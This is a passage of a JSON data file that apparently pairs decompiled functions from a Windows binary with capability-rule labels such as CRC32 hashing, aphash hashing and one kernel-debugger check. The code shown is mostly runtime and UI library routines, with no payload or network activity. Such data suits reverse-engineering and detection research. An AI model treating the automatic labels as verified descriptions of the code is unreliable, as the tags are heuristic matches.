        "decompiled_code": "\nvoid __thiscall fcn.00407cb0(int32_t param_1, int32_t param_2)\n\n{\n    ushort uVar1;\n    uint16_t uVar2;\n    \n    if ((~*(param_2 + 0x18) & 1) != 0) {\n        uVar1 = *(param_1 + 8);\n        if (*(param_2 + 0x2c) < *(param_2 + 0x28) + 2U) {\n            fcn.00424e09();\n        }\n        **(param_2 + 0x28) = uVar1;\n        *(param_2 + 0x28) = *(param_2 + 0x28) + 2;\n        fcn.00425011(param_2, *(*(param_1 + 4) + -0xc), 0);\n        fcn.004250a0(*(param_1 + 4), *(*(param_1 + 4) + -0xc));\n        (**(*(param_1 + 0xc) + 8))(param_2);\n        return;\n    }\n    if ((*(param_2 + 0x18) & 1) == 0) {\n        fcn.00425c42(4, *(param_2 + 0x14));\n    }\n    if (*(param_2 + 0x2c) < *(param_2 + 0x28) + 2U) {\n        fcn.00424e80((*(param_2 + 0x28) - *(param_2 + 0x2c)) + 2);\n    }\n    uVar2 = **(param_2 + 0x28);\n    *(param_2 + 0x28) = *(param_2 + 0x28) + 1;\n    *(param_1 + 8) = uVar2;\n    fcn.00407b30(param_2, param_1 + 4);\n    (**(*(param_1 + 0xc) + 8))(param_2);\n    return;\n}\n",
        "token_count": 454
    },
    "004087fa": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004087fa(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    uchar unaff_SI;\n    \n    if ((~*(param_1 + 0x18) & 1) == 0) {\n        fcn.00425c42(2, *(param_1 + 0x14));\n    }\n    uVar1 = *(param_1 + 0x28) + 1;\n    if (*(param_1 + 0x2c) <= uVar1 && uVar1 != *(param_1 + 0x2c)) {\n        fcn.00424e09();\n    }\n    **(param_1 + 0x28) = unaff_SI;\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 1;\n    return param_1;\n}\n",
        "token_count": 195
    },
    "00408832": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00408832(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    uint unaff_ESI;\n    uint unaff_retaddr;\n    \n    if ((~*(param_1 + 0x18) & 1) == 0) {\n        fcn.00425c42(2, *(param_1 + 0x14));\n    }\n    uVar2 = *(param_1 + 0x28) + 8;\n    if (*(param_1 + 0x2c) <= uVar2 && uVar2 != *(param_1 + 0x2c)) {\n        fcn.00424e09();\n    }\n    puVar1 = *(param_1 + 0x28);\n    *puVar1 = unaff_ESI;\n    puVar1[1] = unaff_retaddr;\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 8;\n    return param_1;\n}\n",
        "token_count": 232
    },
    "00408874": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00408874(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    uint unaff_ESI;\n    \n    if ((~*(param_1 + 0x18) & 1) == 0) {\n        fcn.00425c42(2, *(param_1 + 0x14));\n    }\n    uVar1 = *(param_1 + 0x28) + 4;\n    if (*(param_1 + 0x2c) <= uVar1 && uVar1 != *(param_1 + 0x2c)) {\n        fcn.00424e09();\n    }\n    **(param_1 + 0x28) = unaff_ESI;\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 4;\n    return param_1;\n}\n",
        "token_count": 197
    },
    "004088af": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004088af(int32_t param_1)\n\n{\n    uchar *unaff_ESI;\n    \n    if ((*(param_1 + 0x18) & 1) == 0) {\n        fcn.00425c42(4, *(param_1 + 0x14));\n    }\n    if (*(param_1 + 0x2c) < *(param_1 + 0x28) + 1U) {\n        fcn.00424e80((*(param_1 + 0x28) - *(param_1 + 0x2c)) + 1);\n    }\n    *unaff_ESI = **(param_1 + 0x28);\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 1;\n    return param_1;\n}\n",
        "token_count": 192
    },
    "004088ee": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004088ee(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint *unaff_ESI;\n    \n    if ((*(param_1 + 0x18) & 1) == 0) {\n        fcn.00425c42(4, *(param_1 + 0x14));\n    }\n    if (*(param_1 + 0x2c) < *(param_1 + 0x28) + 8U) {\n        fcn.00424e80((*(param_1 + 0x28) - *(param_1 + 0x2c)) + 8);\n    }\n    puVar1 = *(param_1 + 0x28);\n    *unaff_ESI = *puVar1;\n    unaff_ESI[1] = puVar1[1];\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 8;\n    return param_1;\n}\n",
        "token_count": 223
    },
    "00408936": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00408936(int32_t param_1)\n\n{\n    uint *unaff_ESI;\n    \n    if ((*(param_1 + 0x18) & 1) == 0) {\n        fcn.00425c42(4, *(param_1 + 0x14));\n    }\n    if (*(param_1 + 0x2c) < *(param_1 + 0x28) + 4U) {\n        fcn.00424e80((*(param_1 + 0x28) - *(param_1 + 0x2c)) + 4);\n    }\n    *unaff_ESI = **(param_1 + 0x28);\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 4;\n    return param_1;\n}\n",
        "token_count": 192
    },
    "0040c5d0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t fcn.0040c5d0(uint32_t *param_1, uint32_t *param_2, uint32_t param_3)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint8_t uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint32_t *puVar8;\n    bool bVar9;\n    \n    uVar3 = param_3;\n    if (param_3 != 0) {\n        if (((param_1 | param_2) & 3) == 0) {\n            uVar3 = param_3 & 3;\n            param_3 = param_3 >> 2;\n            bVar9 = param_3 == 0;\n            puVar7 = param_1;\n            puVar8 = param_2;\n            if (!bVar9) {\n                do {\n                    param_1 = puVar7;\n                    param_2 = puVar8;\n                    if (param_3 == 0) break;\n                    param_3 = param_3 - 1;\n                    param_2 = puVar8 + 1;\n                    param_1 = puVar7 + 1;\n                    bVar9 = *puVar7 == *puVar8;\n                    puVar7 = param_1;\n                    puVar8 = param_2;\n                } while (bVar9);\n                if (!bVar9) {\n                    uVar3 = param_1[-1];\n                    uVar1 = param_2[-1];\n                    bVar9 = uVar3 < uVar1;\n                    if (((uVar3 == uVar1) &&\n                        (uVar5 = uVar3 >> 8,  uVar6 = uVar1 >> 8,  bVar9 = uVar5 < uVar6,  uVar5 == uVar6)) &&\n                       (uVar5 = uVar3 >> 0x10,  uVar6 = uVar1 >> 0x10,  bVar9 = uVar5 < uVar6,  uVar5 == uVar6)) {\n                        bVar9 = uVar3 >> 0x18 < uVar1 >> 0x18;\n                    }\n                    goto code_r0x0040c650;\n                }\n            }\n            if (uVar3 != 0) {\n                uVar1 = *param_1;\n                uVar2 = *param_2;\n                bVar9 = uVar1 < uVar2;\n                if (uVar1 != uVar2) {\ncode_r0x0040c650:\n                    return (1 - bVar9) - (bVar9 != 0);\n                }\n                uVar4 = uVar3 - 1;\n                if (uVar4 != 0) {\n                    uVar5 = uVar2 >> 8;\n                    uVar6 = uVar1 >> 8;\n                    bVar9 = uVar6 < uVar5;\n                    if (uVar6 != uVar5) goto code_r0x0040c650;\n                    uVar4 = uVar3 - 2;\n                    if (uVar4 != 0) {\n                        bVar9 = (uVar1 & 0xff0000) < (uVar2 & 0xff0000);\n                        if ((uVar1 & 0xff0000) != (uVar2 & 0xff0000)) goto code_r0x0040c650;\n                        uVar4 = uVar3 - 3;\n                    }\n                }\n                return uVar4;\n            }\n        }\n        else {\n            if ((param_3 & 1) == 0) goto code_r0x0040c603;\n            bVar9 = *param_1 < *param_2;\n            if (*param_1 != *param_2) goto code_r0x0040c650;\n            param_1 = param_1 + 1;\n            param_2 = param_2 + 1;\n            for (param_3 = param_3 - 1; uVar3 = param_3,  param_3 != 0; param_3 = param_3 - 2) {\ncode_r0x0040c603:\n                bVar9 = *param_1 < *param_2;\n                if ((*param_1 != *param_2) ||\n                   (bVar9 = *(param_1 + 1) < *(param_2 + 1),  *(param_1 + 1) != *(param_2 + 1))) goto code_r0x0040c650;\n                param_2 = param_2 + 2;\n                param_1 = param_1 + 2;\n            }\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 1050
    },
    "0040ef40": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t fcn.0040ef40(uint *param_1, uint8_t *param_2)\n\n{\n    uint16_t uVar1;\n    uint uVar2;\n    uint8_t uVar3;\n    bool bVar4;\n    \n    if ((param_1 & 3) != 0) {\n        if ((param_1 & 1) != 0) {\n            uVar3 = *param_1;\n            param_1 = param_1 + 1;\n            bVar4 = uVar3 < *param_2;\n            if (uVar3 != *param_2) goto code_r0x0040ef84;\n            param_2 = param_2 + 1;\n            if (uVar3 == 0) {\n                return 0;\n            }\n            if ((param_1 & 2) == 0) goto code_r0x0040ef50;\n        }\n        uVar1 = *param_1;\n        param_1 = param_1 + 2;\n        uVar3 = uVar1;\n        bVar4 = uVar3 < *param_2;\n        if (uVar3 != *param_2) goto code_r0x0040ef84;\n        if (uVar3 == 0) {\n            return 0;\n        }\n        uVar3 = uVar1 >> 8;\n        bVar4 = uVar3 < param_2[1];\n        if (uVar3 != param_2[1]) goto code_r0x0040ef84;\n        if (uVar3 == 0) {\n            return 0;\n        }\n        param_2 = param_2 + 2;\n    }\ncode_r0x0040ef50:\n    while( true ) {\n        uVar2 = *param_1;\n        uVar3 = uVar2;\n        bVar4 = uVar3 < *param_2;\n        if (uVar3 != *param_2) break;\n        if (uVar3 == 0) {\n            return 0;\n        }\n        uVar3 = uVar2 >> 8;\n        bVar4 = uVar3 < param_2[1];\n        if (uVar3 != param_2[1]) break;\n        if (uVar3 == 0) {\n            return 0;\n        }\n        uVar3 = uVar2 >> 0x10;\n        bVar4 = uVar3 < param_2[2];\n        if (uVar3 != param_2[2]) break;\n        if (uVar3 == 0) {\n            return 0;\n        }\n        uVar3 = uVar2 >> 0x18;\n        bVar4 = uVar3 < param_2[3];\n        if (uVar3 != param_2[3]) break;\n        param_2 = param_2 + 4;\n        param_1 = param_1 + 1;\n        if (uVar3 == 0) {\n            return 0;\n        }\n    }\ncode_r0x0040ef84:\n    return bVar4 * -2 + 1;\n}\n",
        "token_count": 678
    },
    "004147c7": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004147c7(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_7ch;\n    uint var_4h;\n    \n    var_4h = *0x44e0fc;\n    uVar1 = fcn.00414775();\n    iVar2 = (**0x451474)(uVar1, (-(*0x451464 != 0) & 0xfffff005) + 0x1002, &var_7ch, 0x78);\n    if (iVar2 == 0) {\n        *0x451454 = 0;\n    }\n    else {\n        iVar2 = fcn.00416565(*0x451468, &var_7ch);\n        if ((iVar2 == 0) && (iVar2 = fcn.00414674(uVar1),  iVar2 != 0)) {\n            *0x451454 = *0x451454 | 4;\n            *0x451458 = uVar1;\n            *0x45145c = uVar1;\n        }\n    }\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 258
    },
    "004148cc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004148cc(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint arg_ch;\n    uint var_7ch;\n    uint var_4h;\n    \n    var_4h = *0x44e0fc;\n    arg_8h_00 = fcn.00414775();\n    iVar1 = (**0x451474)(arg_8h_00, (-(*0x451464 != 0) & 0xfffff005) + 0x1002, &var_7ch, 0x78);\n    if (iVar1 == 0) {\n        *0x451454 = 0;\n        goto code_r0x00414ad9;\n    }\n    iVar1 = fcn.00416565(*0x451468, &var_7ch);\n    if (iVar1 == 0) {\n        iVar1 = (**0x451474)(arg_8h_00, (-(*0x451460 != 0) & 0xfffff002) + 0x1001, &var_7ch, 0x78);\n        if (iVar1 != 0) {\n            iVar1 = fcn.00416565(*0x451470, &var_7ch);\n            if (iVar1 == 0) {\n                *0x451454 = *0x451454 | 0x304;\n                *0x451458 = arg_8h_00;\n                *0x45145c = arg_8h_00;\n            }\n            else if ((*0x451454 & 2) == 0) {\n                if ((*0x45146c == 0) || (iVar1 = fcn.004165ce(*0x451470, &var_7ch, *0x45146c),  iVar1 != 0)) {\n                    if (((*0x451454 & 1) == 0) && (iVar1 = fcn.00414674(arg_8h_00),  iVar1 != 0)) {\n                        *0x451454 = *0x451454 | 1;\n                        *0x45145c = arg_8h_00;\n                    }\n                }\n                else {\n                    *0x451454 = *0x451454 | 2;\n                    *0x45145c = arg_8h_00;\n                    iVar1 = fcn.0040baf0(*0x451470);\n                    if (iVar1 == *0x45146c) {\n                        *0x451458 = arg_8h_00;\n                    }\n                }\n            }\n            goto code_r0x004149f7;\n        }\ncode_r0x00414a2b:\n        *0x451454 = 0;\n        goto code_r0x00414ad9;\n    }\ncode_r0x004149f7:\n    if ((*0x451454 & 0x300) == 0x300) goto code_r0x00414ad9;\n    iVar1 = (**0x451474)(arg_8h_00, (-(*0x451460 != 0) & 0xfffff002) + 0x1001, &var_7ch, 0x78);\n    if (iVar1 == 0) goto code_r0x00414a2b;\n    iVar1 = fcn.00416565(*0x451470, &var_7ch);\n    if (iVar1 == 0) {\n        *0x451454 = *0x451454 | 0x200;\n        if (((*0x451460 == 0) && (*0x45146c != 0)) && (iVar1 = fcn.0040baf0(*0x451470),  iVar1 == *0x45146c)) {\n            arg_ch = 1;\n            goto code_r0x00414aa9;\n        }\n    }\n    else {\n        if (((*0x451460 != 0) || (*0x45146c == 0)) ||\n           (iVar1 = fcn.004165ce(*0x451470, &var_7ch, *0x45146c),  iVar1 != 0)) goto code_r0x00414ad9;\n        arg_ch = 0;\ncode_r0x00414aa9:\n        iVar1 = fcn.0041485b(arg_8h_00, arg_ch);\n        if (iVar1 == 0) goto code_r0x00414ad9;\n    }\n    *0x451454 = *0x451454 | 0x100;\n    if (*0x451458 == 0) {\n        *0x451458 = arg_8h_00;\n    }\ncode_r0x00414ad9:\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 1058
    },
    "004154e7": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t fcn.004154e7(void)\n\n{\n    uint32_t uVar1;\n    uint16_t uVar2;\n    uint16_t unaff_BX;\n    \n    uVar1 = 0;\n    if ((unaff_BX & 1) != 0) {\n        uVar1 = 0x10;\n    }\n    if ((unaff_BX & 4) != 0) {\n        uVar1 = uVar1 | 8;\n    }\n    if ((unaff_BX & 8) != 0) {\n        uVar1 = uVar1 | 4;\n    }\n    if ((unaff_BX & 0x10) != 0) {\n        uVar1 = uVar1 | 2;\n    }\n    if ((unaff_BX & 0x20) != 0) {\n        uVar1 = uVar1 | 1;\n    }\n    if ((unaff_BX & 2) != 0) {\n        uVar1 = uVar1 | 0x80000;\n    }\n    uVar2 = unaff_BX & 0xc00;\n    if ((unaff_BX & 0xc00) != 0) {\n        if (uVar2 == 0x400) {\n            uVar1 = uVar1 | 0x100;\n        }\n        else if (uVar2 == 0x800) {\n            uVar1 = uVar1 | 0x200;\n        }\n        else if (uVar2 == 0xc00) {\n            uVar1 = uVar1 | 0x300;\n        }\n    }\n    if ((unaff_BX & 0x300) == 0) {\n        uVar1 = uVar1 | 0x20000;\n    }\n    else if ((unaff_BX & 0x300) == 0x200) {\n        uVar1 = uVar1 | 0x10000;\n    }\n    if ((unaff_BX & 0x1000) != 0) {\n        uVar1 = uVar1 | 0x40000;\n    }\n    return uVar1;\n}\n",
        "token_count": 473
    },
    "00415800": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00415800(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint uVar2;\n    uint *puVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040bc40(0x445270, 0xc);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 < *0x452678) {\n        piVar1 = (arg_8h_00 >> 5) * 4 + 0x452680;\n        iVar4 = (arg_8h_00 & 0x1f) * 0x24;\n        if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n            fcn.00416fef(arg_8h_00);\n            *(unaff_EBP + -4) = 0;\n            if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                puVar3 = fcn.0040adb0();\n                *puVar3 = 9;\n                puVar3 = fcn.0040adb9();\n                *puVar3 = 0;\n                *(unaff_EBP + -0x1c) = 0xffffffff;\n            }\n            else {\n                uVar2 = fcn.0041578c(arg_8h_00, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                *(unaff_EBP + -0x1c) = uVar2;\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.00415887();\n            goto code_r0x004158a5;\n        }\n    }\n    puVar3 = fcn.0040adb0();\n    *puVar3 = 9;\n    puVar3 = fcn.0040adb9();\n    *puVar3 = 0;\ncode_r0x004158a5:\n    fcn.0040bc7b();\n    return;\n}\n",
        "token_count": 515
    },
    "00415a79": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00415a79(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint uVar2;\n    uint *puVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040bc40(0x445280, 0xc);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 < *0x452678) {\n        piVar1 = (arg_8h_00 >> 5) * 4 + 0x452680;\n        iVar4 = (arg_8h_00 & 0x1f) * 0x24;\n        if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n            fcn.00416fef(arg_8h_00);\n            *(unaff_EBP + -4) = 0;\n            if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                puVar3 = fcn.0040adb0();\n                *puVar3 = 9;\n                puVar3 = fcn.0040adb9();\n                *puVar3 = 0;\n                *(unaff_EBP + -0x1c) = 0xffffffff;\n            }\n            else {\n                uVar2 = fcn.004158ab(arg_8h_00, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                *(unaff_EBP + -0x1c) = uVar2;\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.00415b00();\n            goto code_r0x00415b1e;\n        }\n    }\n    puVar3 = fcn.0040adb0();\n    *puVar3 = 9;\n    puVar3 = fcn.0040adb9();\n    *puVar3 = 0;\ncode_r0x00415b1e:\n    fcn.0040bc7b();\n    return;\n}\n",
        "token_count": 518
    },
    "00416fae": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint fcn.00416fae(uint32_t param_1)\n\n{\n    uint *puVar1;\n    \n    if ((param_1 < *0x452678) &&\n       (puVar1 = *((param_1 >> 5) * 4 + 0x452680) + (param_1 & 0x1f) * 0x24,  (*(puVar1 + 1) & 1) != 0)) {\n        return *puVar1;\n    }\n    puVar1 = fcn.0040adb0();\n    *puVar1 = 9;\n    puVar1 = fcn.0040adb9();\n    *puVar1 = 0;\n    return 0xffffffff;\n}\n",
        "token_count": 159
    },
    "00417513": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00417513(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint uVar2;\n    uint *puVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040bc40(0x445308, 0xc);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 < *0x452678) {\n        piVar1 = (arg_8h_00 >> 5) * 4 + 0x452680;\n        iVar4 = (arg_8h_00 & 0x1f) * 0x24;\n        if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n            fcn.00416fef(arg_8h_00);\n            *(unaff_EBP + -4) = 0;\n            if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                puVar3 = fcn.0040adb0();\n                *puVar3 = 9;\n                puVar3 = fcn.0040adb9();\n                *puVar3 = 0;\n                *(unaff_EBP + -0x1c) = 0xffffffff;\n            }\n            else {\n                uVar2 = fcn.00417338(arg_8h_00, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                *(unaff_EBP + -0x1c) = uVar2;\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.0041759a();\n            goto code_r0x004175b8;\n        }\n    }\n    puVar3 = fcn.0040adb0();\n    *puVar3 = 9;\n    puVar3 = fcn.0040adb9();\n    *puVar3 = 0;\ncode_r0x004175b8:\n    fcn.0040bc7b();\n    return;\n}\n",
        "token_count": 515
    },
    "00418428": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00418428(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint uVar2;\n    uint *puVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040bc40(0x445370, 0xc);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 < *0x452678) {\n        piVar1 = (arg_8h_00 >> 5) * 4 + 0x452680;\n        iVar4 = (arg_8h_00 & 0x1f) * 0x24;\n        if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n            fcn.00416fef(arg_8h_00);\n            *(unaff_EBP + -4) = 0;\n            if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                puVar3 = fcn.0040adb0();\n                *puVar3 = 9;\n                *(unaff_EBP + -0x1c) = 0xffffffff;\n            }\n            else {\n                uVar2 = fcn.004183a5(arg_8h_00);\n                *(unaff_EBP + -0x1c) = uVar2;\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.0041849f();\n            goto code_r0x004184bd;\n        }\n    }\n    puVar3 = fcn.0040adb0();\n    *puVar3 = 9;\n    puVar3 = fcn.0040adb9();\n    *puVar3 = 0;\ncode_r0x004184bd:\n    fcn.0040bc7b();\n    return;\n}\n",
        "token_count": 461
    },
    "00419714": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.00419714(char *arg_8h, char **arg_ch)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t *puVar4;\n    uint *puVar5;\n    char *arg_ch_00;\n    float10 fVar6;\n    uint var_20h;\n    double dStack12;\n    \n    cVar1 = *arg_8h;\n    arg_ch_00 = arg_8h;\n    while (iVar3 = fcn.0040fdd0(cVar1),  iVar3 != 0) {\n        arg_ch_00 = arg_ch_00 + 1;\n        cVar1 = *arg_ch_00;\n    }\n    fcn.0040baf0(arg_ch_00, 0, 0);\n    puVar4 = fcn.004197a4(&var_20h, arg_ch_00);\n    if (arg_ch != NULL) {\n        *arg_ch = arg_ch_00 + puVar4[1];\n    }\n    uVar2 = *puVar4;\n    if ((uVar2 & 0x240) == 0) {\n        if ((uVar2 & 0x81) == 0) {\n            if ((uVar2 & 0x100) == 0) {\n                return *(puVar4 + 4);\n            }\n            dStack12 = 0.0;\n        }\n        else {\n            dStack12 = *0x44ef74;\n            if (*arg_ch_00 == '-') {\n                dStack12 = -*0x44ef74;\n            }\n        }\n        puVar5 = fcn.0040adb0();\n        fVar6 = dStack12;\n        *puVar5 = 0x22;\n    }\n    else {\n        fVar6 = 0;\n        if (arg_ch != NULL) {\n            *arg_ch = arg_8h;\n        }\n    }\n    return fVar6;\n}\n",
        "token_count": 437
    },
    "0041ccba": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041ccba(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    if ((*(param_1 + 0x39) & 1) == 0) {\n        (*_sym.imp.USER32.dll_IsDialogMessageA)(*(param_1 + 0x1c), param_2);\n    }\n    else {\n        iVar1 = fcn.00434fe8();\n        (**(**(iVar1 + 0x1038) + 0x24))(param_1, param_2);\n    }\n    return;\n}\n",
        "token_count": 133
    },
    "0041e95b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.0041e95b(int32_t *param_1, uint8_t param_2)\n\n{\n    bool bVar1;\n    bool bVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t unaff_EBX;\n    uint8_t unaff_retaddr;\n    \n    bVar1 = true;\n    bVar2 = false;\n    if (((param_2 & 4) == 0) || (uVar4 = fcn.0041cced(),  (uVar4 & 0x10000000) != 0)) {\n        bVar1 = false;\n    }\n    iVar5 = (*_sym.imp.USER32.dll_GetParent)(param_1[7]);\n    param_1[0xe] = param_1[0xe] | 0x18;\n    iVar6 = fcn.0041d1da();\n    pcVar3 = _sym.imp.USER32.dll_UpdateWindow;\ncode_r0x0041ea1a:\n    while ((!bVar2 || (iVar7 = (*_sym.imp.USER32.dll_PeekMessageA)(iVar6, 0, 0, 0, 0),  iVar7 != 0))) {\n        do {\n            iVar7 = fcn.0041d4de();\n            if (iVar7 == 0) {\n                fcn.0043a912(0);\n                return -1;\n            }\n            if ((bVar1) && ((*(iVar6 + 4) == 0x118 || (*(iVar6 + 4) == 0x104)))) {\n                fcn.0041cdb9(1);\n                (*pcVar3)(param_1[7]);\n                bVar1 = false;\n            }\n            iVar7 = (**(*param_1 + 0x80))();\n            if (iVar7 == 0) {\n                param_1[0xe] = param_1[0xe] & 0xffffffe7;\n                return param_1[0x10];\n            }\n            iVar7 = fcn.0041d44a(iVar6);\n            if (iVar7 != 0) {\n                bVar2 = true;\n                unaff_EBX = 0;\n            }\n            iVar7 = (*_sym.imp.USER32.dll_PeekMessageA)(iVar6, 0, 0, 0, 0);\n        } while (iVar7 != 0);\n    }\n    if (bVar1) {\n        fcn.0041cdb9(1);\n        (*pcVar3)(param_1[7]);\n        bVar1 = false;\n    }\n    if ((((unaff_retaddr & 1) == 0) && (iVar5 != 0)) && (unaff_EBX == 0)) {\n        (*_sym.imp.USER32.dll_SendMessageA)(iVar5, 0x121, 0, param_1[7]);\n    }\n    if ((unaff_retaddr & 2) == 0) goto code_r0x0041e9fb;\n    goto code_r0x0041ea16;\ncode_r0x0041e9fb:\n    iVar7 = (*_sym.imp.USER32.dll_SendMessageA)(param_1[7], 0x36a, 0, unaff_EBX);\n    unaff_EBX = unaff_EBX + 1;\n    if (iVar7 == 0) {\ncode_r0x0041ea16:\n        bVar2 = false;\n    }\n    goto code_r0x0041ea1a;\n}\n",
        "token_count": 796
    },
    "0041eb10": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nbool __cdecl fcn.0041eb10(uint32_t arg_8h)\n\n{\n    uint noname_8;\n    uint noname_11;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint32_t uVar3;\n    uint unaff_EDI;\n    bool bVar4;\n    uint *noname_0;\n    uint32_t var_34h;\n    uint var_30h;\n    uint in_stack_ffffffd0;\n    uint in_stack_ffffffd4;\n    uint var_24h;\n    uint in_stack_ffffffdc;\n    uint var_1ch;\n    uint var_18h;\n    uint in_stack_ffffffe8;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00434fe8();\n    arg_8h = arg_8h & ~*(var_4h + 0x18);\n    if (arg_8h == 0) {\n        bVar4 = true;\n    }\n    else {\n        uVar3 = 0;\n        fcn.0040bbe0(&var_34h, 0, 0x28);\n        var_30h = 